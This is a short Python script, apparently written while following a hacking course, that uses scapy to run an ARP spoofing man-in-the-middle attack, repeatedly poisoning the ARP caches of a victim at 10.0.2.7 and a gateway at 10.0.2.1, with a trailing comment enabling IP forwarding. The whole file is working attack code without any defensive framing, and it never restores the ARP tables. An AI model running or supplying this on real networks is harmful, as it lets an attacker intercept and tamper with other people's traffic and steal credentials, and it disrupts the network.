#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()     to check output
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()       to check output
    arp_request_broadcast = broadcast/arp_request  # to combine two variable
    # arp_request_broadcast.show() to check output of combine
    # we create 2 variable because function returns  2 list elements
    answered_list, unanswered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)
    # timeout cause not stuck in code if there isn't answer
    # verbose=false  dont allows to write unnecassary words
   # print(answered_list.summary())  # to check output
    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # we wait a response  so we use 2
    packet = scapy.ARP(op=2,  pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # pdst = target ip address   hwdst = own mac address   psrc= gateway
    scapy.send(packet, verbose=False)


sent_packets_count = 0
while True:
    spoof("10.0.2.7", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.7")
    sent_packets_count += 2
    # \r  to write every print same line  (dynamic line)
    print("\r[+] Packets sent:" + str(sent_packets_count), end="")
    sys.stdout.flush()              # dont repeat print for every line
    time.sleep(2)


# echo 1 > /proc/sys/net/ipv4/ip_forward
